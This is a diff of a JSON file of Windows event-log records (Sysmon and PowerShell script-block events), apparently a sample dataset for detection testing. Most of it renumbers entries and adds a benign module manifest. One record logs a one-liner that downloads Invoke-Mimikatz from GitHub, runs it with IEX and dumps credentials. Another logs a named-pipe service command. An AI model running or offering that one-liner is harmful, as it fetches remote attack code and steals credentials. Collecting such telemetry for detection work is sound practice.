       "ScriptBlockText": "@{\r\nGUID=\"1DA87E53-152B-403E-98DC-74D7B4D63D59\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"\u00a9 Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nCmdletsToExport= \"Format-List\", \"Format-Custom\", \"Format-Table\", \"Format-Wide\",\r\n    \"Out-File\", \"Out-Printer\", \"Out-String\",\r\n    \"Out-GridView\", \"Get-FormatData\", \"Export-FormatData\", \"ConvertFrom-Json\", \"ConvertTo-Json\",\r\n    \"Invoke-RestMethod\", \"Invoke-WebRequest\", \"Register-ObjectEvent\", \"Register-EngineEvent\",\r\n    \"Wait-Event\", \"Get-Event\", \"Remove-Event\", \"Get-EventSubscriber\", \"Unregister-Event\",\r\n    \"New-Event\", \"Add-Member\", \"Add-Type\", \"Compare-Object\", \"ConvertTo-Html\", \"ConvertFrom-StringData\",\r\n    \"Export-Csv\", \"Import-Csv\", \"ConvertTo-Csv\", \"ConvertFrom-Csv\", \"Export-Alias\", \"Invoke-Expression\",\r\n    \"Get-Alias\", \"Get-Culture\", \"Get-Date\", \"Get-Host\", \"Get-Member\", \"Get-Random\", \"Get-UICulture\",\r\n    \"Get-FileHash\", \"Get-Unique\", \"Export-PSSession\", \"Import-PSSession\", \"Import-Alias\", \"Import-LocalizedData\",\r\n    \"Select-String\", \"Measure-Object\", \"New-Alias\", \"New-TimeSpan\", \"Read-Host\", \"Set-Alias\", \"Set-Date\",\r\n    \"Start-Sleep\", \"Tee-Object\", \"Measure-Command\", \"Update-List\", \"Update-TypeData\", \"Update-FormatData\",\r\n    \"Remove-TypeData\", \"Get-TypeData\", \"Write-Host\", \"Write-Progress\", \"New-Object\", \"Select-Object\",\r\n    \"Group-Object\", \"Sort-Object\", \"Get-Variable\", \"New-Variable\", \"Set-Variable\", \"Remove-Variable\",\r\n    \"Clear-Variable\", \"Export-Clixml\", \"Import-Clixml\", \"ConvertTo-Xml\", \"Select-Xml\", \"Write-Debug\",\r\n    \"Write-Verbose\", \"Write-Warning\", \"Write-Error\", \"Write-Output\", \"Set-PSBreakpoint\", \"Get-PSBreakpoint\",\r\n    \"Remove-PSBreakpoint\", \"Enable-PSBreakpoint\", \"Disable-PSBreakpoint\", \"Get-PSCallStack\",\r\n    \"Send-MailMessage\", \"Get-TraceSource\", \"Set-TraceSource\", \"Trace-Command\", \"Show-Command\", \"Unblock-File\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Utility.dll\",\"Microsoft.PowerShell.Utility.psm1\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285758'\r\n}\r\n"
     }
   },
-  "112032": {
+  "100018": {
+    "event_id": 4104,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "provider_name": "Microsoft-Windows-PowerShell",
+    "computer": "FS03.offsec.lan",
+    "timestamp": "2021-10-25T07:23:05.614172Z",
+    "event_data": {
+      "ScriptBlockText": "@{\r\nGUID=\"1DA87E53-152B-403E-98DC-74D7B4D63D59\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"\u00a9 Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nCmdletsToExport= \"Format-List\", \"Format-Custom\", \"Format-Table\", \"Format-Wide\",\r\n    \"Out-File\", \"Out-Printer\", \"Out-String\",\r\n    \"Out-GridView\", \"Get-FormatData\", \"Export-FormatData\", \"ConvertFrom-Json\", \"ConvertTo-Json\",\r\n    \"Invoke-RestMethod\", \"Invoke-WebRequest\", \"Register-ObjectEvent\", \"Register-EngineEvent\",\r\n    \"Wait-Event\", \"Get-Event\", \"Remove-Event\", \"Get-EventSubscriber\", \"Unregister-Event\",\r\n    \"New-Event\", \"Add-Member\", \"Add-Type\", \"Compare-Object\", \"ConvertTo-Html\", \"ConvertFrom-StringData\",\r\n    \"Export-Csv\", \"Import-Csv\", \"ConvertTo-Csv\", \"ConvertFrom-Csv\", \"Export-Alias\", \"Invoke-Expression\",\r\n    \"Get-Alias\", \"Get-Culture\", \"Get-Date\", \"Get-Host\", \"Get-Member\", \"Get-Random\", \"Get-UICulture\",\r\n    \"Get-FileHash\", \"Get-Unique\", \"Export-PSSession\", \"Import-PSSession\", \"Import-Alias\", \"Import-LocalizedData\",\r\n    \"Select-String\", \"Measure-Object\", \"New-Alias\", \"New-TimeSpan\", \"Read-Host\", \"Set-Alias\", \"Set-Date\",\r\n    \"Start-Sleep\", \"Tee-Object\", \"Measure-Command\", \"Update-List\", \"Update-TypeData\", \"Update-FormatData\",\r\n    \"Remove-TypeData\", \"Get-TypeData\", \"Write-Host\", \"Write-Progress\", \"New-Object\", \"Select-Object\",\r\n    \"Group-Object\", \"Sort-Object\", \"Get-Variable\", \"New-Variable\", \"Set-Variable\", \"Remove-Variable\",\r\n    \"Clear-Variable\", \"Export-Clixml\", \"Import-Clixml\", \"ConvertTo-Xml\", \"Select-Xml\", \"Write-Debug\",\r\n    \"Write-Verbose\", \"Write-Warning\", \"Write-Error\", \"Write-Output\", \"Set-PSBreakpoint\", \"Get-PSBreakpoint\",\r\n    \"Remove-PSBreakpoint\", \"Enable-PSBreakpoint\", \"Disable-PSBreakpoint\", \"Get-PSCallStack\",\r\n    \"Send-MailMessage\", \"Get-TraceSource\", \"Set-TraceSource\", \"Trace-Command\", \"Show-Command\", \"Unblock-File\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Utility.dll\",\"Microsoft.PowerShell.Utility.psm1\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285758'\r\n}\r\n"
+    }
+  },
+  "112039": {
     "event_id": 12,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
@@ -6517,7 +6601,7 @@
     "timestamp": "2017-12-13T14:48:10.480438Z",
     "event_data": {}
   },
-  "108523": {
+  "108522": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6527,7 +6611,7 @@
       "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
     }
   },
-  "112033": {
+  "112040": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6537,7 +6621,7 @@
       "ScriptBlockText": "function Check-Obfu($string){\r\n    # Check how many special characters are in the command. Inspired by Invoke-Obfuscation: https://twitter.com/danielhbohannon/status/778268820242825216\r\n    # There are many ways to do this, including regex. Need a way that doesn't kill the CPU. This works, but isn't super concise. There is probably a\r\n    # better way.\r\n    # \r\n    $obfutext=\"\" # Local variable for return output\r\n    $maxchars=25\r\n    #$obfuchars = \"\\+\", \"\\'\", \"\\}\", \"\\{\"\r\n    #foreach ($char in $obfuchars){\r\n    #\r\n    # I tried to loop through the characters (as the two commented lines above show, but\r\n    # hit problems of variable interpolation. I am probably making a simple mistake.\r\n    # If you can get the above loop working, please email deepblue at backshore dot net. \r\n    # I will repay in an adult beverage \r\n    #\r\n    # In the meantime, this is ugly, but works\r\n    $string2 = $string -replace \"`'\"\r\n    # Compare the length\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ' characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`{\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars { characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`}\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars } characters`n\"\r\n    }\r\n    $string2 = $string -replace \",\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars , characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`\"\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars double quotes`n\"\r\n    }\r\n    return $obfutext\r\n    #}\r\n}"
     }
   },
-  "100018": {
+  "100019": {
     "event_id": 4104,
     "channel": "Microsoft-Windows-PowerShell/Operational",
     "provider_name": "Microsoft-Windows-PowerShell",
@@ -6668,7 +6752,7 @@
       "ImagePath": "cmd.exe /c echo genusn > \\\\.\\pipe\\genusn"
     }
   },
-  "112034": {
+  "112041": {
     "event_id": 7,
     "channel": "Microsoft-Windows-Sysmon/Operational",
     "provider_name": "Microsoft-Windows-Sysmon",
